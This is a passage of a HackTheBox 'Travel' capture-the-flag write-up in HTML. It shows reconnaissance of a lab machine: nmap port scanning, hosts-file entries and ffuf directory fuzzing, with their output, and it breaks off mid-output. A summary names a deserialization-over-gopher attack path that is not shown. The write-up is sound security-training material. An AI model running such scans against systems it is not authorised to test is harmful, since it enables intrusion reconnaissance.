<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Travel | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,hard"><meta name=description content="Travel HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/travel/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/travel/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Travel "><meta property="og:description" content="Travel HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/travel/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/travel/travel.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-09-15T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/travel/travel.png"><meta name=twitter:title content="Travel "><meta name=twitter:description content="Travel HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Travel ","item":"https://s4ch.github.io/writeups/hackthebox/travel/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Travel ","name":"Travel ","description":"Travel HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","hard"],"articleBody":"Information Name: Travel Profile: www.hackthebox.eu Difficulty: Hard OS: Linux Points: 40 Overview TL;DR: Tricky RCE exploiting PHP deserialization through memcache over gopher. Then pe through password hash cracking \u0026 docker.\nInstall tools used in this WU on BlackArch Linux:\n1 pacman -S nmap ffuf gittools haiti git openssh gopherus openldap gtfo gtfoblookup Network enumeration Port \u0026 service discovery with a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # Nmap 7.80 scan initiated Fri Jul 31 19:52:02 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.189 Nmap scan report for 10.10.10.189 Host is up (0.023s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.17.6 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.17.6 |_http-title: Travel.HTB 443/tcp open ssl/http nginx 1.17.6 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.17.6 |_http-title: Travel.HTB - SSL coming soon. | ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK | Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb | Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-04-23T19:24:29 | Not valid after: 2030-04-21T19:24:29 | MD5: ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698 |_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 31 19:52:39 2020 -- 1 IP address (1 host up) scanned in 36.46 seconds Let’s add the local domain to our host file, it’s important not to miss the Subject Alternative Name from the nmap scan:\n1 2 3 4 5 $ cat /etc/hosts | grep travel 10.10.10.189 travel.htb 10.10.10.189 www.travel.htb 10.10.10.189 blog.travel.htb 10.10.10.189 blog-dev.travel.htb HTTP discovery The site on port 80 http://www.travel.htb/ is just a default HTML template.\nThe site on port 443 https://www.travel.htb/ seems not available yet.\nAt first glance, there is nothing, so we’ll need enumeration.\nHTTP enumeration With ffuf I’ll try to find some sub-directories or pages:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ ffuf -u http://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://www.travel.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ index.html [Status: 200, Size: 5093, Words: 842, Lines: 145] js [Status: 403, Size: 154, Words: 3, Lines: 8] css [Status: 403, Size: 154, Words: 3, Lines: 8] img [Status: 403, Size: 154, Words: 3, Lines: 8] lib [Status: 403, Size: 154, Words: 3, Lines: 8] . [Status: 200, Size: 5093, Words: 842, Lines: 145] newsfeed [Status: 403, Size: 154, Words: 3, Lines: 8] :: Progress: [153068/153068] :: Job [1/1] :: 1000 req/sec :: Duration: [0:02:33] :: Errors: 0 :: Nothing on the HTTP site. But we didn’t found many thing either for the HTTPS website:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ ffuf -u https://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : https://www.travel.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ index.html [Status: 200, Size: 1123, Words: 104, Lines: 52] . [Status: 200, Size: 1123, Words: 104, Lines: 52] :: Progress: [153068/153068] :: Job [1/1] :: 950 req/sec :: Duration: [0:02:41] :: Errors: 0 :: The SSL version of blog.travel.htb and blog-dev.travel.htb are both serving the same content as https://www.travel.htb/ but the version in HTTP is different.\nhttp://blog.travel.htb/\nWe may have a hint here:\nWelcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!\nThe feed URL is: http://blog.travel.htb/feed/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ","wordCount":"5462","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/travel/travel.png","datePublished":"2020-09-15T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/travel/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Travel</h1><div class=post-description>Travel HackTheBox writeup</div><div class=post-meta><span title='2020-09-15 00:00:00 +0000 UTC'>September 15, 2020</span>&nbsp;·&nbsp;26 min&nbsp;·&nbsp;5462 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/hard/ class=post-tag title=hard>hard</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/travel/travel.png alt="Travel HackTheBox Machine"><p>Travel - Hard Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation--code-analysis>HTTP exploitation & code analysis</a></li><li><a href=#privilege-escalation-of-machine--from-www-data-to-lynik-admin>Privilege Escalation of Machine : from www-data to lynik-admin</a></li><li><a href=#privilege-escalation-of-machine--from-lynik-admin-to-root>Privilege Escalation of Machine : from lynik-admin to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Travel</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/252>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 40</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: Tricky RCE exploiting PHP deserialization through memcache over gopher. Then pe through password hash cracking & docker.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>pacman</span> <span class=o>-</span><span class=n>S</span> <span class=n>nmap</span> <span class=n>ffuf</span> <span class=n>gittools</span> <span class=n>haiti</span> <span class=n>git</span> <span class=n>openssh</span> <span class=n>gopherus</span> <span class=n>openldap</span> <span class=n>gtfo</span> <span class=n>gtfoblookup</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery with a <a href=https://nmap.org/>nmap</a> scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Fri Jul 31 19:52:02 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.189
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.189
</span></span><span class=line><span class=cl>Host is up (0.023s latency).
</span></span><span class=line><span class=cl>Not shown: 65532 closed ports
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>80/tcp  open  http     nginx 1.17.6
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.17.6
</span></span><span class=line><span class=cl>|_http-title: Travel.HTB
</span></span><span class=line><span class=cl>443/tcp open  ssl/http nginx 1.17.6
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.17.6
</span></span><span class=line><span class=cl>|_http-title: Travel.HTB - SSL coming soon.
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
</span></span><span class=line><span class=cl>| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
</span></span><span class=line><span class=cl>| Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
</span></span><span class=line><span class=cl>| Public Key type: rsa
</span></span><span class=line><span class=cl>| Public Key bits: 2048
</span></span><span class=line><span class=cl>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl>| Not valid before: 2020-04-23T19:24:29
</span></span><span class=line><span class=cl>| Not valid after:  2030-04-21T19:24:29
</span></span><span class=line><span class=cl>| MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698
</span></span><span class=line><span class=cl>|_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Fri Jul 31 19:52:39 2020 -- 1 IP address (1 host up) scanned in 36.46 seconds
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s add the local domain to our host file, it&rsquo;s important not to miss
the <strong>Subject Alternative Name</strong> from the <a href=https://nmap.org/>nmap</a> scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep travel
</span></span><span class=line><span class=cl>10.10.10.189 travel.htb
</span></span><span class=line><span class=cl>10.10.10.189 www.travel.htb
</span></span><span class=line><span class=cl>10.10.10.189 blog.travel.htb
</span></span><span class=line><span class=cl>10.10.10.189 blog-dev.travel.htb
</span></span></code></pre></td></tr></table></div></div><h2 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h2><p>The site on port 80 <a href=http://www.travel.htb/>http://www.travel.htb/</a> is just a default HTML template.</p><p>The site on port 443 <a href=https://www.travel.htb/>https://www.travel.htb/</a> seems not available yet.</p><p><img loading=lazy src=https://i.imgur.com/TfJvags.jpg alt="port 443 website"></p><p>At first glance, there is nothing, so we&rsquo;ll need enumeration.</p><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>With <a href=https://github.com/ffuf/ffuf>ffuf</a> I&rsquo;ll try to find some sub-directories or pages:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=n>travel</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>r</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>e</span> <span class=o>.</span><span class=n>txt</span><span class=p>,</span><span class=o>.</span><span class=n>html</span><span class=p>,</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=n>travel</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Extensions</span>       <span class=p>:</span> <span class=o>.</span><span class=n>txt</span> <span class=o>.</span><span class=n>html</span> <span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=o>.</span><span class=n>html</span>              <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>5093</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>842</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>145</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>js</span>                      <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>154</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>css</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>154</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>img</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>154</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>lib</span>                     <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>154</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>5093</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>842</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>145</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>newsfeed</span>                <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>403</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>154</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>153068</span><span class=o>/</span><span class=mi>153068</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>1000</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>02</span><span class=p>:</span><span class=mi>33</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>Nothing on the HTTP site. But we didn&rsquo;t found many thing either for the HTTPS
website:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
